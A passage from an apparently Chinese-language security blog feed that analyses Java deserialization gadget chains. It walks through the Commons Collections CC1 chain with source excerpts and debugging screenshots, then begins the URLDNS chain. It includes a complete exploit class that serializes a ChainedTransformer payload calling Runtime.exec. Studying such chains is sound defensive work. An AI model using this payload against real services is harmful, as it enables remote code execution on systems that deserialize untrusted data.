punctuation">.</span>io<span class="token punctuation">.</span>ObjectInputStream s<span class="token punctuation">)</span>        <span class="token keyword">throws</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//...略</span>        Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">>></span> memberTypes <span class="token operator">=</span> annotationType<span class="token punctuation">.</span><span class="token function">memberTypes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>Map<span class="token punctuation">.</span>Entry<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">></span> memberValue <span class="token operator">:</span> memberValues<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            String name <span class="token operator">=</span> memberValue<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> memberType <span class="token operator">=</span> memberTypes<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>memberType <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// i.e. member still exists</span>                Object value <span class="token operator">=</span> memberValue<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>memberType<span class="token punctuation">.</span><span class="token function">isInstance</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token operator">||</span>                      value <span class="token keyword">instanceof</span> <span class="token class-name">ExceptionProxy</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    memberValue<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>                        <span class="token keyword">new</span> <span class="token class-name">AnnotationTypeMismatchExceptionProxy</span><span class="token punctuation">(</span>                            value<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"["</span> <span class="token operator">+</span> value <span class="token operator">+</span> <span class="token string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setMember</span><span class="token punctuation">(</span>                                annotationType<span class="token punctuation">.</span><span class="token function">members</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>观察该类的构造方法为default，因此我们只能通过反射来调用。</p><pre class="line-numbers language-java"><code class="language-java">        Class <span class="token class-name">c</span><span class="token operator">=</span>Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Constructor annotationInvocationHandlerConstructor <span class="token operator">=</span>c<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span>Class<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Map<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        annotationInvocationHandlerConstructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Object o<span class="token operator">=</span>annotationInvocationHandlerConstructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>Override<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>transformedMap<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>反射调用后，是不是觉得可以尝试反序列化测试了？</p><p>注意前面的注释，Runtime类是不可以被序列化的，因此我们不能通过Runtime.getRuntime()来进行序列化，因此我们也需要反射来调用。</p><pre class="line-numbers language-java"><code class="language-java">        Method method<span class="token operator">=</span> <span class="token punctuation">(</span>Method<span class="token punctuation">)</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Runtime r<span class="token operator">=</span> <span class="token punctuation">(</span>Runtime<span class="token punctuation">)</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>null<span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果仔细调试或者阅读源码就会发现仅仅凭借InvokerTransformer是走不通的，因为可以看到checkSetValue只调用了一次transform，并且AnnotationInvocationHandler#readobject给Map赋值是写死为new AnnotationTypeMismatchExceptionProxy的，而我们要传进来的是Runtime.class（因为要RCE），所以你没办法通过InvokerTransforme直接反射RCE。</p><p>而我们发现，Transformer的实现有这重要的三种：</p><ol><li>ConstantTransformer –&gt; 把⼀个对象转换为常量</li><li>InvokerTransformer –&gt; 通过反射，返回⼀个对象 -&gt; 反射获取执行方法加入参数</li><li>ChainedTransformer –&gt;执⾏链式的Transformer⽅法 -&gt;将反射包含的数组进行链式调用，从而连贯起来</li></ol><p><strong>因此，我们就可以通过ChainedTransformer达到调用多次transform方法的目的，该函数是把前一个的输出当作当前的transform方法的输入执行。并且我们可以看到数组第一个元素为new ConstantTransformer(Runtime.class)，该类把⼀个对象转换为常量，也就是说我们传进去Runtime.class，他就会返回Runtime.class，而不是annotationTypeMismatchExceptionProxy，这也就绕过了之前提到写死的参数。</strong></p><pre class="line-numbers language-java"><code class="language-java">        Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> transformers<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>            <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>null<span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        ChainedTransformer c<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        c<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>回顾checkSetValue。</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token keyword">protected</span> Object <span class="token function">checkSetValue</span><span class="token punctuation">(</span>Object value<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> valueTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>回顾AnnotationInvocationHandler的readobject关键代码。</p><pre class="line-numbers language-java"><code class="language-java">                    memberValue<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>                        <span class="token keyword">new</span> <span class="token class-name">AnnotationTypeMismatchExceptionProxy</span><span class="token punctuation">(</span>                            value<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"["</span> <span class="token operator">+</span> value <span class="token operator">+</span> <span class="token string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setMember</span><span class="token punctuation">(</span>                                annotationType<span class="token punctuation">.</span><span class="token function">members</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="调试-链子"><a href="#调试-链子" class="headerlink" title="调试+链子"></a>调试+链子</h5><p>首先反序列化执行AnnotationInvocationHandler#readobject，调用了setValue方法，并且写死了传入的参数。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220818222425288.png" alt="image-20220818222425288"  /><p>接着调用了AbstractInputCheckedMapDecorator#setValue,可以看到parent为TransformedMap，这也是为什么要Map&lt;Object,Object&gt; transformedMap&#x3D;TransformedMap.decorate(map,null,c)的原因，就是为了调用他的父类AbstractInputCheckedMapDecorator#setValue方法</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220818223127855.png" alt="image-20220818223127855"></p><p>继续跟进，此时value还是写死的参数。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220818224244527.png" alt="image-20220818224244527"></p><p>进入到链式调用transform</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220818224356049.png" alt="image-20220818224356049"></p><p>单步执行。此时会执行谁的transform呢？</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220818224442142.png" alt="image-20220818224442142"></p><p>跟进去看看，当然是执行ConstantTransformer的transform啦。因为我们链式调用数组的第一个元素就是ConstantTransformer，因此他直接返回构造函数构造好的iConstant，也就是Runtime.class!!覆盖了写死的值。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220818224550799.png" alt="image-20220818224550799"></p><p>之后就把ConstantTransformer#transform的输出Runtime.class传给下一个transform的input，也就是invoke getRuntime方法从而获取实例，接着在通过获取到的示例执行exec方法即可RCE。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220818225352146.png" alt="image-20220818225352146"></p><p>链子比较短，但是坑点比较多。</p><pre class="line-numbers language-java"><code class="language-java">AnnotationInvocationHandler#readobjectAbstractInputCheckedMapDecorator<span class="token punctuation">.</span>MapEntry#setValueTransformedMap#checksetValueInvokerTransformer#transform<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>Transformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ChainedTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ConstantTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>InvokerTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span>TransformedMap<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Target<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Constructor<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>InvocationTargetException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Method<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CC1Test</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException<span class="token punctuation">,</span> NoSuchMethodException<span class="token punctuation">,</span> InvocationTargetException<span class="token punctuation">,</span> InstantiationException<span class="token punctuation">,</span> IllegalAccessException <span class="token punctuation">{</span>        Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> transformers<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>null<span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        ChainedTransformer c<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        HashMap map<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Map<span class="token operator">&lt;</span>Object<span class="token punctuation">,</span>Object<span class="token operator">></span> transformedMap<span class="token operator">=</span>TransformedMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span>null<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>        Class <span class="token class-name">cc</span><span class="token operator">=</span>Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Constructor annotationInvocationHandlerConstructor <span class="token operator">=</span>cc<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span>Class<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Map<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        annotationInvocationHandlerConstructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Object o<span class="token operator">=</span>annotationInvocationHandlerConstructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>Target<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>transformedMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">serialize</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        ObjectOutputStream objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"ser.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h5><ol><li><a href="https://space.bilibili.com/2142877265?spm_id_from=333.337.0.0">https://space.bilibili.com/2142877265?spm_id_from=333.337.0.0</a>                            白日梦组长</li></ol>]]></content>
      
      
      <categories>
          
          <category> 日常学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gadget </tag>
            
            <tag> Java安全 </tag>
            
            <tag> CC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>URLDNS利用链分析</title>
      <link href="/2021/11/30/urldns-lian-fen-xi/"/>
      <url>/2021/11/30/urldns-lian-fen-xi/</url>
      
        <content type="html"><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><p>第一个gadget chain分析，因为zhege比较简单。</p><h5 id="触发反序列化的条件"><a href="#触发反序列化的条件" class="headerlink" title="触发反序列化的条件"></a>触发反序列化的条件</h5><ol><li>类要继承Serializable：java的序列化以及反序列化一定要继承Serializable。</li><li>找到入口类（重写readObject，调用常见的函数，参数类型宽泛，最好jdk自带）</li><li>调用链 相同名称，相同类型</li><li>执行类中的方法(RCE,SSRF等漏洞)</li><li>反序列化入口</li></ol><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>（我认为）挖gadget需要先找到执行类，猜测URLDNS的作者可能是想挖一个SSRF，因此想到URL这个原生类。因为要挖链子，所以要尽量找同名的方法，可以看到URL有hashCode方法。</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token keyword">int</span> <span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>hashCode <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> hashCode<span class="token punctuation">;</span>        hashCode <span class="token operator">=</span> handler<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> hashCode<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>跟进handler.hashCode()，可以看到执行了getHostAddress方法。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/urldns1.png" style="zoom: 67%;" /><p>而getHostAddress方法执行了getByName方法，getByName方法用于解析域名，该DNS解析过程自然是服务端发起的请求，也就达到了SSRF的目的。</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token keyword">protected</span> <span class="token keyword">synchronized</span> InetAddress <span class="token function">getHostAddress</span><span class="token punctuation">(</span>URL u<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>u<span class="token punctuation">.</span>hostAddress <span class="token operator">!=</span> null<span class="token punctuation">)</span>            <span class="token keyword">return</span> u<span class="token punctuation">.</span>hostAddress<span class="token punctuation">;</span>        String host <span class="token operator">=</span> u<span class="token punctuation">.</span><span class="token function">getHost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>host <span class="token operator">==</span> null <span class="token operator">||</span> host<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> null<span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                u<span class="token punctuation">.</span>hostAddress <span class="token operator">=</span> InetAddress<span class="token punctuation">.</span><span class="token function">getByName</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//关键</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">UnknownHostException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> null<span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SecurityException</span> se<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> null<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> u<span class="token punctuation">.</span>hostAddress<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>现在找到了链子的后半段：</p><p>URL.hashCode() -&gt;URLStreamHandler.hashCode()-&gt;URLStreamHandler.getHostAddress()-&gt;InetAddress.getByName()</p><p>接下来找连接URL.hashCode()的前半段，很容易想到最好是原生类，并且readObject方法中一层接一层最终触发了hashCode方法。观察HashMap类的readObject最后几行调用了hash方法，而如果key不为null则调用key的hashCode方法，也就是说如果key是URL类的对象，则就会调用URL.hashCode()。</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span>java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectInputStream s<span class="token punctuation">)</span>        <span class="token 